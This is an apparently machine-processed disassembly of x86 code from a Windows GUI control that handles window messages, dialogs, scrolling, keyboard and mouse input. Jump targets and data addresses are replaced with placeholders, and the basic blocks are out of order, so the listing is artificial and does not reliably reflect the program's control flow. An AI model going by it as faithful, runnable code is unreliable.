mov ecx [ esi + 0x8 ]
push 0x1
push ecx
mov ecx esi
mov [ esi + 0x4c ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x3c ] eax
call sub_40a6e0
pop ebp
pop ebx
xor edi edi
cmp [ esi + 0x8 ] edi
jg r-xdata
cmp [ esi + 0x8 ] edi
jge r-xdata
mov edx [ esi + 0x5c ]
push 0x0
push 0x0
push edx
mov [ esi + 0x54 ] eax
call [ InvalidateRect@IAT ]
mov edx [ esi + 0x2c ]
add edx ecx
cmp eax edx
jge r-xdata
inc edi
cmp edi 0x3e8
jl r-xdata
lea eax [ edi + ebp ]
push eax
mov ecx esi
mov [ ebx + edi * 8 ] 0x0
call sub_40a600
xor eax eax
mov eax 0x1
jmp r-xdata
cmp eax edi
jl r-xdata
xor eax eax
mov ecx [ esp + 0x10 ]
movzx eax [ ecx ]
jmp r-xdata
cmp eax ecx
jl r-xdata
mov eax [ esp + 0x8 ]
push eax
mov ecx esi
call sub_40a600
mov ecx [ esi + 0x8 ]
push ecx
mov ecx esi
call sub_40a600
jmp r-xdata
cmp [ ebx + edi * 8 ] 0x0
je r-xdata
mov ebx [ ebx + 0x1f40 ]
xor eax eax
add ebp 0x3e8
cmp ebx eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x54 ]
cmp eax ecx
jl r-xdata
cmp [ esp + 0x8 ] eax
jge r-xdata
push eax
push edi
mov ecx esi
call sub_40a6e0
mov eax [ esi + 0x8 ]
cmp edi eax
je r-xdata
pop edi
pop esi
pop ecx
retn 0x8
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x58 ] ax
cmp [ esp + 0x8 ] edi
je r-xdata
sub eax [ esi + 0x2c ]
inc eax
mov ecx esi
call sub_40a6b0
mov edi [ esi + 0x8 ]
lea eax [ esp + 0x10 ]
push eax
push edi
mov ecx esi
call sub_40a290
test eax eax
je r-xdata
dec edi
jmp r-xdata
inc edi
jmp r-xdata
mov edx [ esi + 0x5c ]
push 0x0
push 0xfffffff4
push edx
call [ GetWindowLongA@IAT ]
mov ecx [ esi + 0x5c ]
movzx eax ax
or eax 0x10000
push eax
push 0x111
push ecx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
sub_40b1e0
sub esp 0xc
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
push edi
push eax
mov ebp ecx
call sub_40ac60
mov ecx [ esp + 0x24 ]
mov edi eax
push ecx
mov ecx ebp
mov [ esp + 0x24 ] edi
call sub_40ac60
push edi
mov ecx ebp
mov ebx eax
call sub_40a490
cmp ebx edi
mov [ esp + 0x10 ] eax
jge r-xdata
push ebx
mov ecx ebp
mov esi edi
call sub_40a490
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x10 ]
mov esi ebx
mov [ esp + 0x24 ] eax
jmp r-xdata
cmp ebx edi
jge r-xdata
push esi
mov ecx ebp
call sub_40a600
mov eax [ esp + 0x24 ]
inc esi
cmp esi eax
jl r-xdata
cmp esi [ esp + 0x24 ]
jge r-xdata
sub eax edi
je r-xdata
cmp edi eax
jge r-xdata
mov eax [ esp + 0x10 ]
dec ebx
push ebx
mov ecx ebp
call sub_40ac60
mov esi eax
push 0x0
push esi
mov ecx ebp
call sub_40b050
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x8
mov [ esp + 0x24 ] eax
jmp r-xdata
jmp r-xdata
push edi
mov ecx ebp
call sub_40a250
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
inc edi
cmp edi ebx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] eax
jge r-xdata
push edi
mov ecx ebp
call sub_40a250
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
dec edi
cmp edi ebx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] eax
jl r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov [ esi ] eax
mov eax [ esp + 0x24 ]
dec eax
mov [ esi + 0x4 ] ecx
mov [ esp + 0x24 ] eax
jne r-xdata
push edi
mov ecx ebp
call sub_40a250
mov ecx [ eax ]
mov [ esi ] ecx
mov edx [ eax + 0x4 ]
inc edi
cmp edi ebx
mov [ esi + 0x4 ] edx
mov esi eax
jl r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov [ esi ] eax
mov eax [ esp + 0x20 ]
inc eax
mov [ esi + 0x4 ] ecx
mov ecx [ esp + 0x10 ]
inc ebx
cmp eax ecx
mov [ esp + 0x20 ] eax
jl r-xdata
lea esp [ esp ]
mov edi [ esp + 0x20 ]
mov edi [ esp + 0x20 ]
mov edi edi
jmp r-xdata
push edi
mov ecx ebp
call sub_40a250
mov ecx [ eax ]
mov [ esi ] ecx
mov edx [ eax + 0x4 ]
dec edi
cmp edi ebx
mov [ esi + 0x4 ] edx
mov esi eax
jge r-xdata
sub_40b340
sub esp 0x804
push ebx
push ebp
push esi
mov esi ecx
mov ebp [ esi ]
xor ebx ebx
test ebp ebp
jle r-xdata
mov edx [ esi + 0x5c ]
push edx
call [ SetFocus@IAT ]
push 0x0
push 0x0
mov ecx esi
call sub_40b050
mov eax [ esi + 0x5c ]
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
pop esi
pop ebp
pop ebx
add esp 0x804
retn 0x4
push edi
push ebx
mov ecx esi
call sub_40a490
mov ebp [ esi ]
mov ebx eax
cmp ebx ebp
jl r-xdata
push edi
lea ecx [ esp + 0x418 ]
push ecx
mov ecx esi
call sub_40aea0
lea edx [ esp + 0x414 ]
push edx
lea eax [ esp + 0x18 ]
push eax
call [ esp + 0x820 ]
add esp 0x8
test eax eax
je r-xdata
push ebx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
mov [ esp + 0x18 ] ebx
call sub_40aea0
push ebx
mov ecx esi
call sub_40a490
mov edi eax
cmp edi ebp
jge r-xdata
pop edi
push edi
mov ecx esi
call sub_40a490
mov edi eax
cmp edi [ esi ]
jl r-xdata
push edi
lea ecx [ esp + 0x18 ]
push ecx
mov ecx esi
mov [ esp + 0x18 ] edi
call sub_40aea0
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
push ebx
push eax
mov ecx esi
call sub_40b1e0
sub_40b430
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn 0x8
push ebp
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
pop edi
pop ebp
mov eax [ esi + 0x14 ]
cmp edi eax
jle r-xdata
mov ebp [ esp + 0x10 ]
push edi
push ebp
mov ecx esi
call sub_40a850
test eax eax
je r-xdata
lea edi [ eax - 0x1 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi + 0x10 ]
push ebx
push eax
mov ecx esi
call sub_40a940
dec eax
mov [ esi + 0x4 ] eax
jmp r-xdata
mov edx [ esi + 0xc ]
movsx edx [ edx + eax * 2 ]
mov ebx [ esi + 0x14 ]
add edx edi
cmp edx ebx
jl r-xdata
mov eax [ esi + 0x4 ]
cmp eax ecx
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
sub ecx edi
shl ecx 0x1
push ecx
lea ebx [ edi + edi ]
push eax
lea edx [ ebx + eax ]
push edx
call sub_429090
mov eax [ esi + 0x10 ]
add esp 0xc
test eax eax
jle r-xdata
mov eax [ esi ]
push ebx
push ebp
push eax
call sub_429090
mov eax [ esi + 0x4 ]
add esp 0xc
inc eax
mov [ esi + 0x4 ] eax
pop ebx
mov ecx [ esi + 0xc ]
mov dx [ ecx + eax * 2 - 0x2 ]
lea ecx [ ecx + eax * 2 ]
add dx di
dec eax
test eax eax
mov [ ecx ] dx
jg r-xdata
sub_40b4f0
mov eax [ esp + 0x8 ]
cmp eax 0x110
push esi
mov esi ecx
ja r-xdata
cmp eax 0x111
je r-xdata
je r-xdata
movzx eax [ esp + 0x10 ]
dec eax
je r-xdata
cmp eax 0x214
jne r-xdata
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push edi
push 0x0
push 0x0
push 0x1
push 0x0
push 0x67c
push ebp
mov ecx rw-data
call sub_4206e0
mov edx [ esi + 0x18 ]
push edx
call sub_420ca0
add esp 0x4
push eax
push ebp
call [ SetWindowTextA@IAT ]
push 0x0
push 0x0
push 0x402
push 0x67c
push ebp
call [ SendDlgItemMessageA@IAT ]
mov ebx eax
mov eax [ esi + 0x4 ]
xor edi edi
test eax eax
jle r-xdata
cmp eax 0x5
je r-xdata
mov esi [ esp + 0x8 ]
push 0x0
push 0x0
push 0x402
push 0x67c
push esi
call [ SendDlgItemMessageA@IAT ]
mov eax [ eax + 0x8 ]
push eax
push esi
call [ EndDialog@IAT ]
dec eax
je r-xdata
xor eax eax
pop esi
retn 0x10
mov ecx [ esp + 0x14 ]
push ecx
mov ecx rw-data
call sub_4209c0
xor eax eax
pop esi
retn 0x10
push 0x67c
push ebp
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop ebp
pop ebx
xor eax eax
pop esi
retn 0x10
mov eax [ esi + 0xc ]
movsx ecx [ eax + edi * 2 ]
mov edx [ esi ]
lea eax [ eax + edi * 2 ]
movsx eax [ eax + 0x2 ]
lea edx [ edx + ecx * 2 ]
sub eax ecx
push edx
push eax
mov ecx ebx
call sub_40abf0
mov eax [ esi + 0x4 ]
inc edi
cmp edi eax
jl r-xdata
mov ecx [ esp + 0x10 ]
push ecx
mov ecx rw-data
call sub_420810
xor eax eax
pop esi
retn 0x10
cmp eax 0x53
jne r-xdata
mov edx [ esp + 0x8 ]
push 0xffffffff
push edx
call [ EndDialog@IAT ]
xor eax eax
pop esi
retn 0x10
sub eax 0x67a
jne r-xdata
mov eax [ esp + 0x8 ]
push 0x302
push eax
call sub_414bc0
add esp 0x8
mov eax 0x1
pop esi
retn 0x10
sub_40b650
push edi
mov edi ecx
cmp [ edi ] 0x0
je r-xdata
pop edi
retn 0x4
push ebp
push esi
mov esi [ esp + 0x10 ]
mov al [ esi + 0x48 ]
test al al
jne r-xdata
mov eax [ esi + 0x4c ]
mov ebp [ eax + 0x18 ]
push ebx
mov ebx [ eax + 0x10 ]
push ebp
push ebx
mov ecx edi
call sub_40a850
test eax eax
jne r-xdata
inc [ edi + 0x8 ]
jmp r-xdata
push ebp
push ebx
mov ecx edi
call sub_40b430
mov [ edi + 0x8 ] 0x0
mov [ edi + 0x8 ] 0x1
jmp r-xdata
mov eax [ edi + 0x4 ]
cmp [ edi + 0x8 ] eax
jl r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
movsx ebp [ ecx + eax * 2 + 0x2 ]
mov edx [ edi ]
lea eax [ ecx + eax * 2 ]
movsx ecx [ eax ]
lea edi [ edx + ecx * 2 ]
sub ebp ecx
mov ecx [ esi + 0x4c ]
xor eax eax
mov [ ecx + 0x18 ] eax
mov edx [ esi + 0x4c ]
mov [ esi + 0x5c ] ax
mov ecx [ edx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx esi
call sub_40e3d0
push ebp
push edi
mov ecx esi
call sub_40ee50
mov ecx esi
call sub_40e1a0
mov ecx esi
call sub_40e6d0
mov [ esi + 0x48 ] 0x0
pop esi
pop ebp
dec eax
mov [ edi + 0x8 ] eax
pop ebx
sub_40b700
push ebp
mov ebp [ esp + 0x8 ]
cmp ebp 0xffffffff
push esi
push edi
mov esi ecx
jne r-xdata
mov ecx [ esi + 0x8 ]
movsx edi [ esi + 0x20c ]
lea eax [ esi + 0xc ]
push eax
push ebp
call sub_40abf0
mov ecx esi
call sub_40bad0
push 0x9
mov ecx esi
call sub_40b760
cmp ebp edi
jge r-xdata
movsx ebp [ esi + 0x20c ]
pop edi
pop esi
pop ebp
retn 0x4
push ebx
lea ebx [ esi + ebp * 2 + 0xc ]
sub edi ebp
movzx ecx [ ebx ]
push ecx
mov ecx esi
call sub_40b760
add ebx 0x2
dec edi
jne r-xdata
pop ebx
sub_40b760
push ebx
push ebp
mov ebp [ esp + 0xc ]
cmp ebp 0x1
mov ebx ecx
je r-xdata
cmp ebp 0x20
je r-xdata
movsx eax [ ebx ]
push ebp
push eax
mov ecx rw-data
call sub_4138a0
mov [ ebx ] ax
test ebp 0x7f00
je r-xdata
cmp ebp 0x9
je r-xdata
movsx edx [ ebx + 0x20c ]
mov [ ebx + edx * 2 + 0xc ] bp
inc [ ebx + 0x20c ]
pop ebp
pop ebx
retn 0x4
and ebp 0x7f7f
cmp ebp 0x2121
je r-xdata
mov ecx [ ebx + 0x8 ]
movsx edx [ ebx ]
cmp edx [ ecx + 0x10 ]
jl r-xdata
test ebp 0x7f00
je r-xdata
push esi
movsx esi [ ebx + 0x20c ]
dec esi
js r-xdata
movsx eax [ ebx + 0x20c ]
push eax
mov ecx ebx
call sub_40b700
jmp r-xdata
inc esi
je r-xdata
push edi
lea edi [ ebx + esi * 2 + 0xc ]
pop esi
push esi
mov ecx ebx
call sub_40b700
pop edi
movzx ecx ax
push ecx
call sub_429cb9
add esp 0x4
test eax eax
jne r-xdata
dec esi
sub edi 0x2
test esi esi
jge r-xdata
mov ax [ edi ]
test ah 0x7f
jne r-xdata
sub_40b820
push ebx
mov ebx [ esp + 0xc ]
push esi
xor esi esi
test ebx ebx
push edi
mov edi ecx
jle r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push ebp
mov ebp [ esp + 0x14 ]
movzx eax [ ebp + esi * 2 ]
push eax
mov ecx edi
call sub_40b760
inc esi
cmp esi ebx
jl r-xdata
pop ebp
sub_40b850
push esi
mov esi [ esp + 0x8 ]
mov al [ esi ]
test al al
push edi
mov edi ecx
je r-xdata
pop edi
pop esi
retn 0x4
mov edi edi
movsx eax al
push eax
mov ecx edi
call sub_40b760
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
sub_40b880
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push ebp
mov esi ecx
call sub_40a250
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebp
pop ebx
retn 0x4
cmp [ ebx ] 0x0
je r-xdata
push edi
mov ecx ebx
call sub_40a1b0
push ebp
mov ecx esi
call sub_40a600
inc ebp
push ebp
mov ecx esi
call sub_40a250
push ebp
mov ecx esi
mov edi eax
call sub_40a600
test edi edi
je r-xdata
dec [ esi + 0x4c ]
mov ecx ebx
mov [ ebx + 0x4 ] 0x0
call sub_40a1b0
mov edi [ esi ]
mov eax [ esi + 0x8 ]
dec edi
mov ecx edi
cmp eax ecx
mov [ esi ] edi
pop edi
jl r-xdata
mov eax [ edi ]
mov [ ebx ] eax
mov ecx [ edi + 0x4 ]
mov [ ebx + 0x4 ] ecx
inc ebp
push ebp
mov ecx esi
mov ebx edi
call sub_40a250
push ebp
mov ecx esi
mov edi eax
call sub_40a600
test edi edi
jne r-xdata
push 0x0
dec eax
push eax
mov ecx esi
call sub_40b050
sub_40b920
sub esp 0x408
push ebx
push ebp
push esi
mov ebx ecx
mov eax [ ebx + 0x8 ]
push edi
push eax
mov [ esp + 0x14 ] ebx
call sub_40ac60
mov esi eax
mov [ esp + 0x14 ] esi
nop
push esi
mov ecx ebx
call sub_40a490
mov esi eax
cmp esi [ ebx ]
jle r-xdata
test esi esi
jne r-xdata
cmp esi [ esp + 0x14 ]
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
dec esi
push esi
mov ecx ebx
call sub_40ac60
mov esi eax
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ ebx + 0x5c ]
push 0x0
push edx
mov ecx rw-data
call sub_4108e0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn 0x4
push esi
lea ecx [ esp + 0x1c ]
push ecx
mov ecx ebx
call sub_40aea0
mov ebp eax
mov eax [ esp + 0x41c ]
xor edi edi
sub ebp eax
js r-xdata
xor esi esi
mov esi [ ebx ]
mov al [ rw-data ]
test al al
je r-xdata
lea ebx [ esp + 0x18 ]
mov edi [ esp + 0x10 ]
push 0x0
push esi
mov ecx edi
call sub_40a490
dec eax
push eax
mov ecx edi
call sub_40b050
push 0x1
push esi
mov ecx edi
call sub_40b050
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn 0x4
inc edi
add ebx 0x2
cmp edi ebp
jle r-xdata
push ebx
mov ecx rw-data
call sub_410940
test eax eax
jne r-xdata
mov ebx [ esp + 0x10 ]
jmp r-xdata
sub_40ba10
push ebx
mov ebx [ esp + 0xc ]
cmp ebx 0x110
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x1c ]
jne r-xdata
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x18 ]
push edi
push ecx
push ebx
push esi
mov ecx eax
call sub_40b4f0
pop edi
pop esi
pop ebx
retn
push edi
push 0xffffffeb
push esi
call [ SetWindowLongA@IAT ]
sub_40ba50
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0x8 ]
mov ebx ecx
push ebx
push sub_40ba10
push eax
push 0x3b5
call sub_420d20
add esp 0x10
cmp eax 0xffffffff
je r-xdata
pop esi
pop ebx
retn 0x4
mov ecx [ ebx + 0xc ]
mov edx [ ebx ]
lea eax [ ecx + eax * 2 ]
movsx ecx [ eax ]
push ebp
push edi
movsx edi [ eax + 0x2 ]
mov eax [ esi + 0x4c ]
xor ebx ebx
mov [ eax + 0x18 ] ebx
lea ebp [ edx + ecx * 2 ]
sub edi ecx
mov ecx [ esi + 0x4c ]
mov [ esi + 0x5c ] bx
mov edx [ ecx + 0x8 ]
mov ecx esi
mov [ edx + 0x4 ] ebx
call sub_40e3d0
push edi
push ebp
mov ecx esi
call sub_40ee50
mov ecx esi
call sub_40e1a0
mov ecx esi
call sub_40e6d0
mov ecx esi
mov [ esi + 0x48 ] bl
call sub_40ea70
pop edi
pop ebp
sub_40baf0
push esi
mov esi ecx
mov [ esi + 0x20e ] 0x1
call sub_40bad0
push 0x213d
mov ecx esi
call sub_40b760
mov eax [ esp + 0x8 ]
push eax
call sub_420ca0
add esp 0x4
push eax
mov ecx esi
call sub_40b850
push 0x213d
mov ecx esi
call sub_40b760
push 0xffffffff
mov ecx esi
mov [ esi + 0x20e ] 0x0
call sub_40b700
pop esi
retn 0x4
sub_40bb50
sub esp 0x258
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
add esp 0x258
retn
mov ecx [ esi + 0x5c ]
push ebx
push ebp
push edi
lea eax [ esp + 0x30 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x38 ]
mov ebx [ esp + 0x30 ]
mov ecx [ esi + 0x5c ]
mov edi [ GetWindowRect@IAT ]
sub eax ebx
mov [ esi + 0x4 ] eax
movsx edx [ rw-data ]
sub eax edx
mov [ esi + 0x10 ] eax
lea eax [ esp + 0x30 ]
push eax
push ecx
call edi
mov eax [ esi + 0x5c ]
lea edx [ esp + 0x48 ]
push edx
push eax
call [ GetParent@IAT ]
push eax
call edi
mov edi [ GetSystemMetrics@IAT ]
push 0x2e
call edi
shl eax 0x1
mov ecx eax
mov eax [ esp + 0x3c ]
sub eax ecx
sub eax [ esp + 0x34 ]
cdq
idiv [ esi + 0x1c ]
push 0x2e
mov [ esi + 0x2c ] eax
call edi
mov edx [ esi + 0x2c ]
imul edx [ esi + 0x1c ]
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x34 ]
lea eax [ edx + eax * 2 ]
sub ecx ebx
cmp eax ecx
je r-xdata
mov eax [ esi + 0x8 ]
mov ebp [ esi ]
push eax
mov ecx esi
mov [ esp + 0x30 ] ebp
call sub_40ac60
mov ecx [ esi + 0x54 ]
mov edi eax
push ecx
mov ecx esi
mov [ esp + 0x18 ] edi
mov [ esp + 0x48 ] edi
call sub_40ac60
mov ebx [ esi + 0x64 ]
xor edx edx
cmp ebp edx
mov [ esp + 0x18 ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x10 ] ebx
mov [ esi + 0x68 ] edx
mov [ esi + 0x64 ] edx
mov [ esi + 0x14 ] edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x54 ] edx
mov [ esi ] edx
mov [ esp + 0x28 ] edx
je r-xdata
mov edx [ esp + 0x38 ]
mov ebp [ esp + 0x30 ]
push 0x1
push eax
sub edx ebp
push edx
push 0x4
call edi
mov ebx [ esp + 0x40 ]
sub ebx [ esp + 0x58 ]
push 0x21
sub ebx eax
call edi
sub ebx eax
push ebx
push 0x20
call edi
mov ecx [ esp + 0x40 ]
mov ebx [ esp + 0x58 ]
mov edx [ esi + 0x5c ]
sub ecx ebx
sub ecx eax
push ecx
push edx
call [ MoveWindow@IAT ]
pop edi
pop ebp
pop ebx
pop esi
add esp 0x258
retn
cmp ebx edx
je r-xdata
mov edx [ esi + 0x5c ]
push edx
lea ecx [ esp + 0x5c ]
call sub_40aa30
xor ebp ebp
test ebx ebx
mov [ esp + 0x20 ] ebx
je r-xdata
mov ecx [ esp + 0x18 ]
mov ebx [ esp + 0x18 ]
mov eax [ esi ]
mov [ esi + 0x54 ] ecx
mov ecx [ esi + 0x2c ]
lea ebx [ ecx + ebx - 0x1 ]
cmp ebx eax
mov [ esi + 0x8 ] edi
jle r-xdata
jmp r-xdata
xor edx edx
cmp ebp [ esp + 0x2c ]
mov [ esp + 0x24 ] 0x0
jge r-xdata
cmp [ esi + 0x54 ] edi
jle r-xdata
sub eax ecx
inc eax
mov [ esi + 0x54 ] eax
lea edi [ ebx + 0x4 ]
mov ebp 0x3e8
push 0xffffffff
lea ecx [ esp + 0x5c ]
call sub_40b700
mov eax [ esp + 0x20 ]
mov eax [ eax + 0x1f40 ]
test eax eax
mov [ esp + 0x20 ] eax
jne r-xdata
mov eax [ esp + 0x20 ]
add eax 0x2
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x54 ]
lea eax [ ecx + eax - 0x1 ]
cmp eax edi
jge r-xdata
mov [ esi + 0x54 ] edi
add edi 0x8
dec ebp
jne r-xdata
push eax
call sub_429931
add esp 0x4
xor edx edx
cmp [ esp + 0x24 ] 0x3e8
jge r-xdata
cmp [ esi + 0x54 ] edx
jge r-xdata
sub edi ecx
inc edi
mov [ esi + 0x54 ] edi
mov eax [ edi ]
test eax eax
je r-xdata
mov edi [ ebx + 0x1f40 ]
push ebx
mov [ esp + 0x14 ] edi
call sub_429931
add esp 0x4
test edi edi
jne r-xdata
mov edi [ eax + 0x2 ]
cmp [ edi ] 0x1
movsx ebx [ eax ]
jne r-xdata
mov ecx esi
call sub_40a6b0
pop edi
pop ebp
pop ebx
mov [ esi + 0x54 ] edx
mov ebx [ esp + 0x10 ]
lea esp [ esp ]
mov edi [ esp + 0x14 ]
cmp [ edi ] 0x9
je r-xdata
add edi 0x2
dec ebx
mov [ esp + 0x28 ] 0x1
dec ebx
add edi 0x2
test ebp ebp
je r-xdata
cmp ebp [ esp + 0x44 ]
jne r-xdata
mov ecx [ esi ]
mov [ esp + 0x18 ] ecx
mov ax [ esp + 0x28 ]
lea ecx [ esp + 0x58 ]
mov [ esp + 0x266 ] ax
call sub_40bad0
cmp [ edi ] 0x9
mov [ esp + 0x28 ] 0x0
jne r-xdata
push 0xffffffff
lea ecx [ esp + 0x5c ]
call sub_40b700
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x2c ]
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x10 ]
inc ebp
inc edx
add ecx 0x8
cmp ebp eax
mov [ esp + 0x24 ] edx
mov [ esp + 0x1c ] ecx
jl r-xdata
mov edx [ esi ]
mov [ esp + 0x14 ] edx
push ebx
lea ecx [ esp + 0x5c ]
push edi
call sub_40b820
cmp ebp [ esp + 0x40 ]
jne r-xdata
mov eax [ esp + 0x1c ]
jmp r-xdata
sub_40be40
mov eax [ esp + 0x4 ]
push esi
push edi
push eax
mov edi ecx
call sub_40ac60
mov esi eax
push esi
mov ecx edi
call sub_40a490
sub eax esi
test eax eax
jle r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
push ebx
mov ebx eax
push esi
mov ecx edi
call sub_40b880
dec ebx
jne r-xdata
pop ebx
sub_40be80
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_431c6b
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
push ebx
push ebp
mov ebp [ esp + 0x60 ]
push esi
push edi
mov edi [ esp + 0x64 ]
cmp edi 0x201
mov esi ecx
jg r-xdata
cmp edi 0x406
jg r-xdata
mov ebx [ esp + 0x6c ]
je r-xdata
lea eax [ edi - 0x407 ]
cmp eax 0x5
ja r-xdata
je r-xdata
mov eax ebx
shr eax 0x10
push 0x0
mov [ rw-data ] bx
mov [ rw-data ] ax
call [ GetDoubleClickTime@IAT ]
mov edi [ esp + 0x64 ]
push eax
push 0x2
push edi
call [ SetTimer@IAT ]
push edi
call [ SetCapture@IAT ]
cmp edi 0x100
jg r-xdata
mov ecx [ esp + 0x6c ]
mov edx [ esp + 0x60 ]
push ecx
push ebp
push edi
push edx
call [ DefWindowProcA@IAT ]
jmp [ eax * 4 + jump_table_40cd24 ]
mov edx [ esi + 0x8 ]
push edx
mov ecx esi
call sub_40ac60
mov ebp eax
cmp edi 0x20a
jg r-xdata
cmp ebx 0xffffffff
jne r-xdata
mov ebp ebx
shr ebp 0x10
lea eax [ ebp - 0x1 ]
cdq
idiv [ esi + 0x1c ]
mov ecx [ esi + 0x54 ]
mov edi eax
mov eax [ esi + 0x20 ]
add edi ecx
test eax eax
mov [ esp + 0x6c ] edi
je r-xdata
lea eax [ edi - 0x102 ]
cmp eax 0xfe
ja r-xdata
je r-xdata
push 0x0
push 0x0
mov ecx esi
call sub_40a2d0
xor eax eax
jmp r-xdata
mov eax [ esp + 0x6c ]
push eax
push ebp
mov ecx esi
call sub_40a290
jmp r-xdata
mov ecx esi
call sub_40a640
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov edx [ esp + 0x6c ]
push ecx
push edx
mov ecx esi
call sub_40a6e0
xor eax eax
jmp r-xdata
mov eax [ esp + 0x6c ]
mov [ esi + 0x60 ] eax
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x50 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x4c
retn 0x10
cmp edi 0x286
je r-xdata
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ esi + 0x8 ]
imul ecx eax
lea eax [ eax + eax * 2 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
add ecx eax
mov eax [ esi + 0x4 ]
cdq
sub eax edx
push ecx
sar eax 0x1
push eax
mov ecx esi
call sub_40a4d0
xor eax eax
jmp r-xdata
mov eax [ esp + 0x68 ]
test al 0x8
mov [ esi + 0x28 ] edi
mov [ esi + 0x20 ] 0x1
mov ecx esi
je r-xdata
cmp edi [ esi + 0x28 ]
je r-xdata
movzx edx [ eax + lookup_table_40cbfc ]
jmp [ edx * 4 + jump_table_40cbe4 ]
mov ebx [ GetKeyState@IAT ]
push 0x10
call ebx
xor edx edx
test ax ax
setl dl
push 0x11
mov edi edx
call ebx
mov edx [ esp + 0x68 ]
xor ecx ecx
test ax ax
setl cl
mov eax ecx
lea ecx [ edx - 0x9 ]
cmp ecx 0x7d
mov [ esp + 0x64 ] eax
ja r-xdata
lea eax [ edi - 0x1 ]
cmp eax 0x7a
ja r-xdata
mov edx [ esp + 0x6c ]
mov eax [ esp + 0x68 ]
mov ecx [ esp + 0x60 ]
push edx
push eax
push 0x410
push ecx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
cmp edi 0x402
jne r-xdata
push 0x0
lea eax [ esp + 0x68 ]
push eax
push 0x0
push 0x68
call [ SystemParametersInfoA@IAT ]
mov ecx [ rw-data ]
mov ebx eax
mov eax [ esp + 0x68 ]
movzx edx ax
shr eax 0x10
movsx eax ax
add ecx eax
xor edi edi
test dl 0x4
mov [ esp + 0x64 ] edx
mov [ rw-data ] ecx
jne r-xdata
mov eax edi
sub eax 0x202
je r-xdata
and eax 0x4
push eax
push edi
call sub_40b050
push edi
call sub_40a250
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi + 0x4c ] 0x1
je r-xdata
push 0x11
call [ GetKeyState@IAT ]
xor ecx ecx
test ax ax
setl cl
mov eax ecx
test eax eax
mov [ esp + 0x64 ] eax
jne r-xdata
mov eax [ esp + 0x68 ]
mov ecx [ esp + 0x60 ]
mov edi 0x1
cmp eax edi
jne r-xdata
mov ebp [ GetSystemMetrics@IAT ]
push 0x24
call ebp
movsx edx [ rw-data ]
mov edi [ esp + 0x60 ]
mov ecx eax
movzx eax bx
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jg r-xdata
movzx eax [ esp + 0x68 ]
cmp eax 0x5
ja r-xdata
movzx eax bp
cmp eax 0x7533
jg r-xdata
movzx ecx [ ecx + lookup_table_40cb64 ]
jmp [ ecx * 4 + jump_table_40cb0c ]
movzx eax [ eax + lookup_table_40ca90 ]
jmp [ eax * 4 + jump_table_40ca78 ]
mov eax esi
jmp r-xdata
cmp ecx 0x78
jl r-xdata
cmp ebx 0xffffffff
je r-xdata
mov edx [ esp + 0x60 ]
push 0x2
push edx
mov [ esi + 0x20 ] 0x0
call [ KillTimer@IAT ]
call [ ReleaseCapture@IAT ]
xor eax eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ esi + 0x48 ]
push eax
lea ecx [ esp + 0x70 ]
push ecx
push ebx
mov ecx esi
call sub_40af50
mov ecx [ esi + 0x48 ]
test ecx ecx
mov ecx [ esp + 0x6c ]
jne r-xdata
mov [ esi + 0x3c ] 0x0
jmp r-xdata
